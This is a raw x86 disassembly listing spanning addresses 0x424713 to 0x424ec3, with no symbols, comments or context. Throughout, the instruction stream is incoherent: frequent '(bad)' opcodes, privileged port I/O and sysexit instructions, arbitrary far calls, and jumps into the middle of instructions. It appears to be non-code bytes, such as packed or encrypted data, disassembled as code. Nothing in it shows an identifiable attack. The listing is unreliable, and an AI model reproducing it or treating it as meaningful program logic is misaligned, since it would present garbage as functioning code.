  424713:	lods   eax,DWORD PTR ds:[esi]
  424714:	cmp    DWORD PTR [ebp-0x37],0xf2c248a8
  42471b:	jg     0x4246db
  42471d:	adc    ebx,0x18
  424720:	ret    0x2a28
  424723:	jnp    0x4246c0
  424725:	sti    
  424726:	adc    ch,BYTE PTR [edx-0x1947936b]
  42472c:	std    
  42472d:	push   edx
  42472e:	test   DWORD PTR ds:0xeba86cbd,edx
  424734:	lods   al,BYTE PTR ds:[esi]
  424735:	sbb    edx,ebx
  424737:	xlat   BYTE PTR ds:[ebx]
  424738:	lods   al,BYTE PTR ds:[esi]
  424739:	stc    
  42473a:	and    ah,ah
  42473c:	inc    ecx
  42473d:	shl    esp,cl
  42473f:	(bad)  
  424740:	mov    esi,0xf6f3531e
  424745:	pop    edi
  424746:	pop    ebx
  424747:	mov    dh,BYTE PTR [esi-0x739b57e2]
  42474d:	sbb    al,0x6
  42474f:	push   edi
  424750:	pop    edx
  424751:	retf   
  424752:	jmp    0x4246ed
  424754:	push   esp
  424755:	aas    
  424756:	push   es
  424757:	repnz sbb eax,0xfcc68288
  42475d:	mov    ecx,DWORD PTR [ecx]
  42475f:	data16 jg 0x4246e5
  424762:	out    dx,al
  424763:	jge    0x4247d9
  424765:	fisub  WORD PTR [ebx-0x4c]
  424768:	scas   al,BYTE PTR es:[edi]
  424769:	mov    ebx,0x93a2958b
  42476e:	xor    edi,DWORD PTR [ecx-0x547d6bd7]
  424774:	es mov ah,0xc4
  424777:	push   esp
  424778:	sbb    dh,BYTE PTR [edx+0x101018c4]
  42477e:	inc    esi
  42477f:	jg     0x424788
  424781:	stos   BYTE PTR es:[edi],al
  424782:	mov    ebx,0xe18e6fb0
  424787:	(bad)
  42478b:	mov    ebp,0x74030aba
  424790:	xor    BYTE PTR [ecx-0xd],cl
  424793:	adc    DWORD PTR [ebx+0x6043aea5],ebp
  424799:	cdq    
  42479a:	sbb    edi,DWORD PTR [ebx]
  42479c:	or     DWORD PTR [ebx-0x22343429],esp
  4247a2:	pop    edx
  4247a3:	mov    bh,BYTE PTR [ebp+0x79591e4]
  4247a9:	hlt    
  4247aa:	pop    esp
  4247ab:	lds    ebp,FWORD PTR [edi-0x35d2690e]
  4247b1:	push   eax
  4247b2:	pop    ebx
  4247b3:	in     al,0x96
  4247b5:	popf   
  4247b6:	ror    BYTE PTR [edi+0x783b0c54],1
  4247bc:	in     al,dx
  4247bd:	out    0x46,al
  4247bf:	ret    
  4247c0:	add    DWORD PTR [ebx],0x5c
  4247c3:	mov    eax,0x57be7739
  4247c8:	sbb    DWORD PTR [edx+0x18ad6f84],0xffffffc2
  4247cf:	push   ebp
  4247d0:	ja     0x42484f
  4247d2:	xor    dh,dh
  4247d4:	stc    
  4247d5:	lods   al,BYTE PTR ds:[esi]
  4247d6:	cmp    ebx,DWORD PTR [ebp+eax*1-0x4a]
  4247da:	aas    
  4247db:	aas    
  4247dc:	mov    bh,BYTE PTR [eax-0x5e864c3a]
  4247e2:	jmp    0x424840
  4247e4:	repnz cmp esp,0xffffffd8
  4247e8:	pop    ebx
  4247e9:	xchg   bl,ch
  4247eb:	aaa    
  4247ec:	(bad)  
  4247ed:	sub    al,0x45
  4247ef:	xchg   edi,eax
  4247f0:	mov    al,0x67
  4247f2:	pop    es
  4247f3:	mov    al,0x14
  4247f5:	cmp    al,0xb4
  4247f8:	test   ch,0x1b
  4247fb:	ficomp WORD PTR fs:[edi+eiz*4-0x1a]
  424800:	push   cs
  424801:	(bad)  
  424802:	loop   0x4247d4
  424804:	pop    es
  424805:	ror    BYTE PTR [eax],0x8b
  424808:	mov    eax,ds:0xd8ecdfe8
  42480d:	shl    BYTE PTR [edi-0xf7f577d],1
  424813:	clc    
  424814:	ror    DWORD PTR [ebp-0x6e],1
  424817:	mov    eax,0x193cd484
  42481c:	jo     0x4247dc
  42481e:	xchg   esi,eax
  42481f:	je     0x4247b1
  424821:	and    al,0xcf
  424823:	xor    eax,DWORD PTR [eax]
  424825:	xrelease xchg DWORD PTR [esi-0x61344f8f],ecx
  42482c:	pop    edi
  42482d:	stos   DWORD PTR es:[edi],eax
  42482e:	aam    0x6e
  424830:	daa    
  424831:	lea    esp,[esi+ebp*2]
  424834:	jmp    0x4248a7
  424836:	adc    esi,DWORD PTR [ebp-0x3cc88d2c]
  42483c:	rcl    BYTE PTR [edi+eiz*4-0x40],1
  424840:	call   0xe1885158
  424845:	xor    edx,ebp
  424847:	mov    al,ds:0xd23bb903
  42484c:	out    0xd,al
  42484e:	pop    es
  42484f:	xchg   edx,eax
  424850:	sahf   
  424851:	pop    esp
  424852:	out    dx,eax
  424853:	aaa    
  424854:	mov    esp,DWORD PTR ds:0xaf8411b0
  42485a:	jns    0x424868
  42485c:	pop    edx
  42485d:	mov    eax,ds:0xfc6146ab
  424862:	push   eax
  424863:	pop    esi
  424864:	(bad)  
  424865:	inc    ebp
  424866:	inc    DWORD PTR [ebp-0xcc18a1e]
  42486c:	jb     0x42481a
  42486e:	adc    eax,0x41e4f9ec
  424873:	cmp    ch,dh
  424875:	inc    ebx
  424876:	outs   dx,DWORD PTR ds:[esi]
  424877:	stos   BYTE PTR es:[edi],al
  424878:	cmp    cl,BYTE PTR [esi]
  42487a:	(bad)  
  42487c:	(bad)  
  42487d:	sti    
  42487e:	lock sti 
  424880:	pop    edi
  424881:	push   0x525d2dc
  424886:	es retf 0x93ac
  42488a:	aad    0x8d
  42488c:	mov    ecx,0x914693ab
  424891:	leave  
  424892:	outs   dx,DWORD PTR ds:[esi]
  424893:	sub    ah,BYTE PTR [ecx]
  424895:	call   0xe88d:0xe9353879
  42489c:	or     esp,DWORD PTR [eax]
  42489e:	mov    eax,0x1f04af6e
  4248a3:	adc    esp,edi
  4248a5:	rcl    esi,1
  4248a7:	add    eax,0x27128a8a
  4248ac:	adc    ebp,DWORD PTR [edi+0x2e]
  4248af:	cmp    ah,ah
  4248b1:	stc    
  4248b2:	ins    BYTE PTR es:[edi],dx
  4248b3:	pusha  
  4248b4:	inc    ecx
  4248b5:	jp     0x4248ec
  4248b7:	cld    
  4248b8:	pop    es
  4248b9:	and    al,0xaf
  4248bb:	ins    DWORD PTR es:[edi],dx
  4248bc:	mov    ch,0xc5
  4248be:	xchg   esp,eax
  4248bf:	shl    ah,cl
  4248c1:	cmp    ecx,DWORD PTR [eax-0x1bf5ae8c]
  4248c7:	mov    ebp,0xa2a227d0
  4248cc:	out    0xc9,al
  4248ce:	imul   ecx,ebp,0xf01abb9e
  4248d4:	jne    0x424880
  4248d6:	inc    ecx
  4248d7:	dec    ecx
  4248d8:	(bad)  
  4248d9:	aad    0xe2
  4248db:	xor    bl,BYTE PTR [eax+ecx*4]
  4248de:	and    eax,0xfe38077b
  4248e3:	data16 fwait
  4248e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248e6:	gs jbe 0x4248d8
  4248e9:	sahf   
  4248ea:	push   es
  4248eb:	repz ja 0x424905
  4248ee:	nop
  4248ef:	lea    edi,[esi]
  4248f1:	test   al,0xbd
  4248f3:	cmc    
  4248f4:	xchg   edi,eax
  4248f5:	nop
  4248f6:	jg     0x424889
  4248f8:	enter  0xeda3,0xad
  4248fc:	push   cs
  4248fd:	in     al,dx
  4248fe:	push   ebx
  4248ff:	jle    0x42491a
  424901:	test   eax,0xa0caf34f
  424906:	and    ecx,DWORD PTR [esi-0x58]
  424909:	pop    ds
  42490a:	mov    bh,0xc8
  42490c:	addr16 fyl2xp1 
  42490f:	jb     0x424924
  424911:	push   0xc76be1be
  424916:	inc    eax
  424917:	loopne 0x424936
  424919:	mov    bh,BYTE PTR [edi-0x3035579]
  42491f:	jne    0x42497d
  424921:	jb     0x424978
  424923:	xchg   edi,eax
  424924:	pop    ds
  424925:	xchg   DWORD PTR [edi+ebx*8-0x54f1a0ff],ebp
  42492c:	fwait
  42492d:	popf   
  42492e:	adc    ebp,ebx
  424930:	in     al,dx
  424931:	shld   ecx,eax,0xa
  424935:	scas   eax,DWORD PTR es:[edi]
  424936:	add    DWORD PTR [edx-0x35],eax
  424939:	and    al,0x45
  42493b:	add    BYTE PTR [eax+ebp*2+0x79],ch
  42493f:	jecxz  0x4248e3
  424941:	je     0x42495d
  424943:	into   
  424944:	shl    DWORD PTR [eax],1
  424946:	clc    
  424947:	cmp    eax,0x3012cf99
  42494c:	jbe    0x424994
  42494e:	imul   DWORD PTR [eax+0xd7b915d]
  424954:	(bad)  
  424955:	and    eax,0x603aea04
  42495a:	sti    
  42495b:	inc    esi
  42495c:	bound  ebx,QWORD PTR [esi]
  42495e:	and    BYTE PTR [ebx],ch
  424960:	mov    ecx,edx
  424962:	in     eax,0xe8
  424964:	pop    eax
  424965:	add    edx,ecx
  424967:	in     eax,0xc0
  424969:	mov    dh,BYTE PTR [ebp-0x7b8e9d13]
  42496f:	(bad)  
  424970:	scas   eax,DWORD PTR es:[edi]
  424971:	or     ecx,DWORD PTR [esi+0x2e]
  424974:	dec    edx
  424975:	call   0x7c9d9b6c
  42497a:	aaa    
  42497b:	test   cl,al
  42497d:	dec    esp
  42497e:	imul   esp,DWORD PTR [ecx+0x16e4513d],0x5d7fa2fb
  424988:	pop    ds
  424989:	lea    edx,[ebx*1+0xb4470fc]
  424990:	jg     0x42491d
  424992:	mov    dl,dh
  424994:	cld    
  424995:	mov    dh,0xc1
  424997:	leave  
  424998:	mov    eax,ds:0xbc166da6
  42499d:	fbstp  TBYTE PTR [ecx+0x125663db]
  4249a3:	scas   al,BYTE PTR es:[edi]
  4249a4:	clc    
  4249a5:	adc    ch,0xb6
  4249a8:	xchg   ebx,eax
  4249a9:	add    al,0x0
  4249ab:	sysexit 
  4249ad:	cmp    ebx,DWORD PTR [eax]
  4249af:	lea    esi,[eax+0x3d]
  4249b2:	dec    ecx
  4249b3:	mov    ebx,0xe81f7c25
  4249b8:	ss add edi,edx
  4249bb:	stos   BYTE PTR es:[edi],al
  4249bc:	xchg   esp,eax
  4249bd:	pop    ds
  4249be:	sbb    bl,BYTE PTR [eax]
  4249c0:	cs jge 0x424973
  4249c3:	xor    BYTE PTR [esi+ebp*1+0x4c],bh
  4249c7:	scas   al,BYTE PTR es:[edi]
  4249c8:	call   0x5989:0x1403bbb2
  4249cf:	dec    esi
  4249d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249d1:	mov    edx,0xfa9a620c
  4249d6:	(bad)  
  4249d8:	push   ecx
  4249d9:	inc    ebx
  4249da:	or     dl,BYTE PTR [edx]
  4249dc:	repz loop 0x4249ac
  4249df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249e0:	pop    ecx
  4249e1:	loope  0x4249e8
  4249e3:	and    edx,DWORD PTR [ebp+0xc]
  4249e6:	rol    cl,0xae
  4249e9:	in     al,dx
  4249ea:	and    BYTE PTR [ebp+0x5d1b3b6a],bh
  4249f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4249f1:	xchg   esp,eax
  4249f2:	adc    cl,BYTE PTR [esi-0x7c]
  4249f5:	fs (bad) 
  4249f7:	xchg   edx,eax
	...
  424a00:	add    BYTE PTR [ebp+0x6a],dl
  424a03:	out    0xb3,al
  424a05:	(bad)  
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	mov    esp,0x28e1b6fd
  424a12:	ret    0x1
  424a15:	scas   eax,DWORD PTR es:[edi]
  424a16:	add    eax,DWORD PTR [eax]
  424a18:	add    al,ah
  424a1a:	mov    WORD PTR [ebp+esi*4-0x2f501eb1],es
  424a21:	xor    BYTE PTR [ebp-0x2f9abe3d],dh
  424a27:	inc    esi
  424a28:	int    0xf9
  424a2a:	and    ebx,DWORD PTR [ebp+edx*8+0x3ee3c46b]
  424a31:	aad    0xd8
  424a33:	icebp  
  424a34:	xor    BYTE PTR [edx],ch
  424a36:	sbb    dh,al
  424a38:	fisub  WORD PTR ds:0x567ce3c5
  424a3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a3f:	sbb    BYTE PTR [edx],bl
  424a41:	xchg   ebx,eax
  424a42:	lea    esi,[eiz*1+0x71c91f1f]
  424a49:	mov    DWORD PTR [edi],ecx
  424a4b:	xchg   edi,eax
  424a4c:	push   0x19802724
  424a51:	fcomp  st(3)
  424a53:	cdq    
  424a54:	scas   eax,DWORD PTR es:[edi]
  424a55:	sbb    al,al
  424a57:	scas   eax,DWORD PTR es:[edi]
  424a58:	mov    esp,0x350d3f35
  424a5d:	ins    BYTE PTR es:[edi],dx
  424a5e:	adc    BYTE PTR [edi-0x160ef4b1],al
  424a64:	clc    
  424a65:	xor    BYTE PTR [ecx-0x437b37fb],bl
  424a6b:	push   esp
  424a6c:	int3   
  424a6d:	imul   ecx,DWORD PTR ds:0xc21fe6d3,0xffffffa7
  424a74:	cdq    
  424a75:	or     DWORD PTR [eax-0xa],esp
  424a78:	and    eax,0x63e71223
  424a7d:	adc    ebp,DWORD PTR [esi-0x68a728d2]
  424a83:	test   eax,0x744dbb9a
  424a88:	xchg   BYTE PTR [edx-0x7f],bl
  424a8b:	fwait
  424a8c:	bnd ret 0x5093
  424a90:	dec    edx
  424a91:	cld    
  424a92:	mov    ebx,0x187b7488
  424a97:	fdiv   st,st(1)
  424a99:	arpl   WORD PTR [edx],sp
  424a9b:	cmp    BYTE PTR [esp+eiz*2],cl
  424a9e:	fimul  DWORD PTR [edi-0x68]
  424aa1:	or     BYTE PTR [ebx],0xad
  424aa4:	retf   
  424aa5:	hlt    
  424aa6:	loope  0x424ab9
  424aa8:	jp     0x424b1e
  424aaa:	push   ss
  424aab:	dec    ecx
  424aac:	scas   eax,DWORD PTR es:[edi]
  424aad:	cmp    al,0x4a
  424aaf:	and    ch,BYTE PTR [eax+0x72]
  424ab2:	mov    esi,0x221e7cc7
  424ab7:	add    eax,0xdf986e35
  424abc:	pop    ds
  424abd:	jnp    0x424a4d
  424abf:	xchg   ecx,eax
  424ac0:	xor    esp,DWORD PTR [ecx]
  424ac2:	mov    ebp,0x9337c075
  424ac7:	mov    ds:0x1bfdf89c,al
  424acc:	xchg   ecx,eax
  424acd:	push   ebp
  424ace:	rcr    BYTE PTR [edi],cl
  424ad0:	or     BYTE PTR [edx],ch
  424ad2:	dec    ebx
  424ad3:	or     BYTE PTR [ebx],bl
  424ad5:	dec    ebp
  424ad6:	ffree  st(7)
  424ad8:	test   edi,ebx
  424ada:	jle    0x424ac1
  424adc:	lea    ecx,[ebp-0x36]
  424adf:	inc    edx
  424ae0:	pop    ebx
  424ae1:	push   esp
  424ae2:	adc    cl,ah
  424ae4:	fild   QWORD PTR [ebx-0x6e45a05a]
  424aeb:	adc    edx,DWORD PTR [ebx+eax*1+0x6]
  424aef:	mov    bl,0xc3
  424af1:	loopne 0x424b5c
  424af3:	mov    esp,0xd3275c4c
  424af8:	xor    al,0x3c
  424afa:	fiadd  WORD PTR [esi+0x16]
  424afd:	ss mov esp,0x2533bcdf
  424b03:	mov    esi,0x47c430e6
  424b08:	in     al,dx
  424b09:	lea    edi,[ebx]
  424b0b:	push   0x43
  424b0d:	jmp    0x424ad8
  424b0f:	xor    eax,0x398a23a6
  424b14:	int    0xf0
  424b16:	cld    
  424b17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424b18:	clc    
  424b19:	mov    al,es:0xc9270de3
  424b1f:	add    bl,BYTE PTR [eax-0x7e044758]
  424b25:	mov    bl,0x51
  424b27:	fadd   DWORD PTR [edi]
  424b29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b2a:	(bad)  
  424b2b:	sub    eax,0x6ca8300e
  424b30:	popf   
  424b31:	outs   dx,BYTE PTR ds:[esi]
  424b32:	push   edx
  424b33:	inc    esp
  424b34:	push   ebx
  424b35:	jg     0x424abe
  424b37:	fs into 
  424b39:	enter  0xeb94,0xcd
  424b3d:	loop   0x424acb
  424b3f:	ss adc al,0xcd
  424b42:	sbb    DWORD PTR [ebp-0x1b],eax
  424b45:	(bad)  
  424b46:	in     al,0x8d
  424b48:	sub    ah,BYTE PTR [ebx+0x4b]
  424b4b:	in     al,0x5b
  424b4d:	xor    ebx,edi
  424b4f:	push   ss
  424b50:	pop    edx
  424b51:	mov    ah,0x8e
  424b53:	out    0x69,eax
  424b55:	dec    BYTE PTR [ebp+ecx*2-0x15e5286d]
  424b5c:	jg     0x424b2c
  424b5e:	(bad)  
  424b5f:	cmp    ch,BYTE PTR [edx]
  424b61:	popa   
  424b62:	dec    edx
  424b63:	pop    eax
  424b64:	fs sahf 
  424b66:	xor    al,0xff
  424b68:	int    0x46
  424b6a:	fwait
  424b6b:	(bad)  
  424b6c:	lods   eax,DWORD PTR ds:[esi]
  424b6d:	adc    BYTE PTR [ebp+eax*4+0x52],0x8f
  424b72:	jge    0x424ba0
  424b74:	aas    
  424b75:	add    al,0x91
  424b77:	aas    
  424b78:	jae    0x424bf9
  424b7a:	add    BYTE PTR [eax-0x4ff74413],dh
  424b80:	pop    ds
  424b81:	dec    edi
  424b82:	xchg   edx,eax
  424b83:	and    al,0xc7
  424b85:	das    
  424b86:	call   0xd1d807e3
  424b8b:	pop    ebx
  424b8c:	lods   al,BYTE PTR ds:[esi]
  424b8d:	mov    al,bh
  424b8f:	fsubp  st(0),st
  424b91:	xchg   esi,eax
  424b92:	(bad)  
  424b93:	(bad)  
  424b94:	popf   
  424b95:	ss gs pop esi
  424b98:	push   edi
  424b99:	cwde   
  424b9a:	mov    esi,0xa752bc73
  424b9f:	out    dx,al
  424ba0:	add    BYTE PTR [ecx+0x410aea70],bl
  424ba6:	stos   DWORD PTR es:[edi],eax
  424ba7:	das    
  424ba8:	jno    0x424bac
  424baa:	iret   
  424bab:	inc    esp
  424bac:	push   ss
  424bad:	jne    0x424b80
  424baf:	xor    al,0x72
  424bb1:	(bad)  
  424bb2:	mov    edi,0xd8ac0850
  424bb7:	(bad)  
  424bb8:	xor    al,0x3
  424bba:	je     0x424b85
  424bbc:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  424bbe:	xchg   edi,eax
  424bbf:	shr    edx,cl
  424bc1:	inc    ecx
  424bc2:	push   ebp
  424bc3:	inc    edx
  424bc4:	dec    eax
  424bc5:	mov    al,ds:0x1c271bd3
  424bca:	push   esi
  424bcb:	ja     0x424c49
  424bcd:	mov    dl,BYTE PTR [ebp+0x1f01025c]
  424bd3:	sbb    al,0x13
  424bd5:	mov    esp,0x57649285
  424bda:	jne    0x424c04
  424bdc:	inc    edx
  424bdd:	add    dh,BYTE PTR ss:[eax-0x18a1ccad]
  424be4:	sub    eax,0x1941597c
  424be9:	xor    DWORD PTR [ebx-0x605d9415],ecx
  424bef:	add    edi,edx
  424bf1:	scas   al,BYTE PTR es:[edi]
  424bf2:	rcr    BYTE PTR [ecx-0x4],1
  424bf5:	mov    esp,0x3bf145f9
  424bfa:	mov    esp,0x7fcdc642
  424bff:	call   0xcb2e:0x756b0cf1
  424c06:	inc    esi
  424c07:	mov    al,ds:0xeeac1dbf
  424c0c:	les    esp,FWORD PTR [ecx]
  424c0e:	xchg   BYTE PTR [esi-0x37b8caeb],bl
  424c14:	fiadd  DWORD PTR [eax+eiz*4]
  424c17:	jb     0x424ba2
  424c19:	mov    bh,0xf5
  424c1b:	sbb    esi,ebp
  424c1d:	jne    0x424bce
  424c1f:	and    DWORD PTR [ecx],edi
  424c21:	pop    edx
  424c22:	outs   dx,DWORD PTR ds:[esi]
  424c23:	aam    0xc4
  424c25:	push   ss
  424c26:	mov    ebp,esi
  424c28:	dec    esi
  424c29:	jne    0x424bb6
  424c2b:	imul   ebx,DWORD PTR [edx],0x1130196e
  424c31:	ficom  WORD PTR [ebp+0x668b930d]
  424c37:	in     eax,dx
  424c38:	mov    edi,0x33bbc34c
  424c3d:	mov    al,ds:0x989c6d18
  424c42:	and    al,0x59
  424c44:	mov    edi,0x887d68c7
  424c49:	es pop ds
  424c4b:	adc    ebp,0xfffffff7
  424c4e:	popf   
  424c4f:	xor    BYTE PTR ds:0xbdfaf0ef,dh
  424c55:	push   ss
  424c56:	mov    ch,bl
  424c58:	jle    0x424c5c
  424c5a:	cmp    al,0xcd
  424c5c:	mov    DWORD PTR [edi-0x65abe01a],esp
  424c62:	stos   DWORD PTR es:[edi],eax
  424c63:	adc    cl,BYTE PTR ds:0x466fdb05
  424c69:	hlt    
  424c6a:	not    edi
  424c6c:	loopne 0x424c27
  424c6e:	lds    ecx,FWORD PTR [eax+0x7]
  424c71:	jmp    0xe7c8:0x8582f8f3
  424c78:	(bad)  
  424c79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424c7a:	test   BYTE PTR [edi+0x3f],bh
  424c7d:	pushf  
  424c7e:	les    esp,FWORD PTR [ecx]
  424c80:	in     eax,dx
  424c81:	jne    0x424c9e
  424c83:	pop    ss
  424c84:	iret   
  424c85:	xchg   esp,eax
  424c86:	mov    ah,0xd7
  424c88:	rcr    DWORD PTR [esp+edx*1-0xa],0x2f
  424c8d:	nop
  424c8e:	xchg   BYTE PTR [ebp+0x46],bh
  424c91:	rol    DWORD PTR [esi],1
  424c93:	mov    bl,0x14
  424c95:	jne    0x424cca
  424c97:	fdiv   st(4),st
  424c99:	dec    ebp
  424c9a:	mov    ds:0xb520e1ed,eax
  424c9f:	mov    BYTE PTR [ecx+ebx*8],cl
  424ca2:	shr    BYTE PTR [ecx],0xb8
  424ca5:	in     eax,0x1e
  424ca7:	xchg   edi,eax
  424ca8:	jmp    0x696:0x1d5a450b
  424caf:	ins    BYTE PTR es:[edi],dx
  424cb0:	ffreep st(3)
  424cb2:	cli    
  424cb3:	mov    edx,esi
  424cb5:	pop    eax
  424cb6:	pop    ecx
  424cb7:	lods   al,BYTE PTR ds:[esi]
  424cb8:	cmp    DWORD PTR [edx],ebp
  424cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cbb:	(bad)  
  424cbc:	push   edi
  424cbd:	jp     0x424d0b
  424cbf:	adc    edi,esi
  424cc1:	inc    ecx
  424cc2:	adc    DWORD PTR [esi],esp
  424cc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424cc5:	cmp    DWORD PTR [esi+0x28],0xffffff99
  424cc9:	push   cs
  424cca:	lock fcmovnb st,st(3)
  424ccd:	pop    ss
  424cce:	outs   dx,BYTE PTR ds:[esi]
  424ccf:	scas   al,BYTE PTR es:[edi]
  424cd0:	sub    bh,dh
  424cd2:	xor    eax,0x9ca1911
  424cd7:	dec    esp
  424cd8:	test   dl,dh
  424cda:	stos   DWORD PTR es:[edi],eax
  424cdb:	out    0xd6,al
  424cdd:	retf   
  424cde:	jne    0x424c67
  424ce0:	sub    esp,DWORD PTR [ebp-0xe]
  424ce3:	mov    dh,0x6f
  424ce5:	in     al,0xd1
  424ce7:	addr16 xchg edi,eax
  424ce9:	and    BYTE PTR [edx-0x21],dh
  424cec:	outs   dx,BYTE PTR ds:[esi]
  424ced:	pop    es
  424cee:	push   ss
  424cef:	mov    dl,0x92
  424cf1:	sar    BYTE PTR [esi+0x5ccdd0f3],0x9a
  424cf8:	mov    bh,0xd4
  424cfa:	mov    esp,DWORD PTR [ebx-0x413c21e0]
  424d00:	(bad)  [eax-0x7a]
  424d03:	mov    BYTE PTR [edx],ch
  424d05:	je     0x424ce5
  424d07:	ror    DWORD PTR [edx+0x19],cl
  424d0a:	mov    WORD PTR [ebp-0x3d4134c3],gs
  424d10:	mov    ebx,0x743523cb
  424d15:	cdq    
  424d16:	xchg   BYTE PTR [edx-0x71c5010f],dh
  424d1c:	push   eax
  424d1d:	fst    QWORD PTR [ecx-0x73]
  424d20:	rcl    BYTE PTR ds:0x1f096cc,cl
  424d26:	lahf   
  424d27:	mov    ds:0x3af6cb5b,al
  424d2c:	inc    esp
  424d2d:	test   dl,0x23
  424d30:	sbb    eax,esi
  424d32:	test   BYTE PTR es:[edi+0x28c3f5f],al
  424d39:	enter  0x81f1,0xe4
  424d3d:	xor    BYTE PTR [ecx],cl
  424d3f:	leave  
  424d40:	mov    ah,0x55
  424d42:	push   esp
  424d43:	std    
  424d44:	pushf  
  424d45:	sbb    eax,DWORD PTR [ebx+0x34063710]
  424d4b:	(bad)  
  424d4c:	sti    
  424d4d:	jo     0x424cff
  424d4f:	call   0xb162bded
  424d54:	(bad)  
  424d55:	jbe    0x424d07
  424d57:	ss out 0xe,al
  424d5a:	aam    0xe1
  424d5c:	aaa    
  424d5d:	dec    ecx
  424d5e:	aad    0xf7
  424d60:	loopne 0x424dbc
  424d62:	dec    edx
  424d63:	mov    esi,0x9d962b3d
  424d68:	xor    ebx,edi
  424d6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d6b:	jb     0x424da9
  424d6d:	ffreep st(7)
  424d6f:	call   0xe7fb:0xf0a16ff8
  424d76:	and    ebx,DWORD PTR [ecx]
  424d78:	in     eax,dx
  424d79:	in     al,dx
  424d7a:	xchg   esp,eax
  424d7b:	jbe    0x424d81
  424d7d:	fld    QWORD PTR [ecx+0x6e]
  424d80:	outs   dx,BYTE PTR ds:[esi]
  424d81:	mov    dh,0xcc
  424d83:	gs pop edx
  424d85:	test   eax,0xc8777af4
  424d8a:	lock retf 0x5693
  424d8e:	or     DWORD PTR [edx+edi*1],edx
  424d91:	cmp    edi,esp
  424d93:	and    esi,DWORD PTR [esi-0x2f4a9665]
  424d99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424d9a:	in     al,0xf7
  424d9c:	ds xchg esp,eax
  424d9e:	enter  0x5962,0x28
  424da2:	mov    ebp,0x2f1dd411
  424da7:	mov    bl,0x75
  424da9:	cmc    
  424daa:	neg    cl
  424dac:	call   0xa009:0x6a12c48d
  424db3:	xor    ebp,edi
  424db5:	jge    0x424dfc
  424db7:	xor    al,0xdc
  424db9:	test   BYTE PTR [ecx],bh
  424dbb:	aaa    
  424dbc:	ds inc ecx
  424dbe:	jle    0x424d79
  424dc0:	xchg   edi,eax
  424dc1:	dec    ebx
  424dc2:	imul   BYTE PTR [ebx-0x7]
  424dc5:	test   DWORD PTR [ecx],0xcc
  424dcb:	add    BYTE PTR [eax],al
  424dcd:	add    BYTE PTR [eax],al
  424dcf:	add    BYTE PTR [eax],al
  424dd1:	mov    ds,WORD PTR ds:0xfffbdb6b
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    ch,BYTE PTR [ebx-0x71]
  424ddf:	es dec ebp
  424de1:	xlat   BYTE PTR ds:[ebx]
  424de2:	lds    eax,FWORD PTR [ecx]
  424de4:	add    BYTE PTR [edi+0x29000003],ch
  424dea:	(bad)  
  424deb:	cmp    esi,DWORD PTR [ebx]
  424ded:	sub    eax,0x4f18fad5
  424df2:	btr    DWORD PTR [ecx+edx*1+0xfa6ab3b],esi
  424dfa:	inc    edi
  424dfb:	jae    0x62681462
  424e01:	push   esp
  424e02:	add    bh,BYTE PTR [esi]
  424e04:	inc    esi
  424e06:	or     BYTE PTR [edx+0x5c],bh
  424e09:	nop
  424e0a:	and    ebp,ecx
  424e0c:	cmp    BYTE PTR [eax],al
  424e0e:	arpl   cx,di
  424e10:	add    BYTE PTR gs:[edx-0x7f],ch
  424e14:	push   0xdacae7eb
  424e19:	ins    BYTE PTR es:[edi],dx
  424e1a:	jns    0x424e4a
  424e1c:	stos   DWORD PTR es:[edi],eax
  424e1d:	fild   WORD PTR [esi-0x5f]
  424e20:	adc    esp,0x58
  424e23:	push   0xc050d6ba
  424e28:	ja     0x424e01
  424e2a:	cwde   
  424e2b:	push   es
  424e2c:	pop    ss
  424e2d:	pop    ebp
  424e2e:	jae    0x424e6f
  424e30:	dec    eax
  424e31:	fbld   TBYTE PTR [edx]
  424e33:	and    al,0x89
  424e35:	sar    BYTE PTR [eax],0xb6
  424e38:	stc    
  424e39:	mov    edi,0x14c6228d
  424e3e:	mul    BYTE PTR [ebp-0x34]
  424e41:	pop    esp
  424e42:	inc    ebp
  424e43:	icebp  
  424e44:	sub    al,0xff
  424e46:	inc    edi
  424e47:	push   edi
  424e48:	mov    eax,ds:0xa28d1d3b
  424e4d:	pop    ss
  424e4e:	imul   ecx,DWORD PTR ds:0x88a5219b,0x137f253
  424e58:	sub    cl,dh
  424e5a:	(bad)  
  424e5c:	inc    bl
  424e5e:	(bad)  ds:0xd3b982d5
  424e64:	sub    DWORD PTR [ebp-0x4f05b0de],ecx
  424e6a:	dec    esp
  424e6b:	pop    ds
  424e6c:	adc    esi,DWORD PTR [esi+0x3f]
  424e6f:	and    DWORD PTR [esi+0x6dec8d5],0xffffff85
  424e76:	xchg   edx,eax
  424e77:	cwde   
  424e78:	inc    eax
  424e79:	mov    dh,0xdb
  424e7b:	daa    
  424e7c:	mov    ebx,0xb4209bdd
  424e81:	push   0xffffffc2
  424e83:	(bad)  
  424e85:	test   BYTE PTR [ebx+0x1e1f37ad],bh
  424e8b:	test   ebp,0xbfad07d6
  424e91:	mov    ecx,0xd1c887dd
  424e96:	push   ss
  424e97:	add    eax,0x4e232783
  424e9c:	rcr    DWORD PTR [ebp+0x77],cl
  424e9f:	xchg   esi,eax
  424ea0:	jo     0x424f21
  424ea2:	aas    
  424ea3:	or     al,0xea
  424ea5:	mov    eax,ds:0x1250e5db
  424eaa:	inc    esi
  424eab:	and    al,0xef
  424ead:	sub    ecx,DWORD PTR [edi]
  424eaf:	call   0x4696a278
  424eb4:	xchg   edx,eax
  424eb5:	dec    ebp
  424eb6:	pop    ds
  424eb7:	lods   eax,DWORD PTR ds:[esi]
  424eb8:	pop    ecx
  424eb9:	mov    ch,0x7
  424ebb:	mov    ah,0xf5
  424ebd:	ficomp DWORD PTR [ecx+0x5eadb98d]
  424ec3:	mov    ds:0x6d878a15,eax
